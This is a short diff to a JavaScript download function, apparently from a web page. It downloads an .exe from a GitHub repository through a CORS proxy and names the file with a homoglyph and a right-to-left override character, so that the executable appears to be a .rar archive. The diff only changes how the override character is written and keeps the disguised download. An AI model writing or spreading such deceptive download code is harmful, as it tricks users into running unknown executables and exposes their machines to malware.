@@ -107,7 +107,7 @@ async function downloadWithHashAndProgress(fileUrl, fileName, onProgress) {
 
 
 async function downloadFile() {
-    downloadWithHashAndProgress('https://proxy.corsfix.com/?https://github.com/Catt3a/razoblaheniya/raw/refs/heads/main/ear/l%D0%BErd%E2%80%AErar.exe', 'lоrd‮rar.exe',
+    downloadWithHashAndProgress('https://proxy.corsfix.com/?https://github.com/Catt3a/razoblaheniya/raw/refs/heads/main/ear/l%D0%BErd%E2%80%AErar.exe', 'lоrd\u202Erar.exe',
     (percent) => {
         console.log(`Загрузка: ${percent}%`);
         progressElement.innerHTML = `Загрузка... (${percent}%)`;
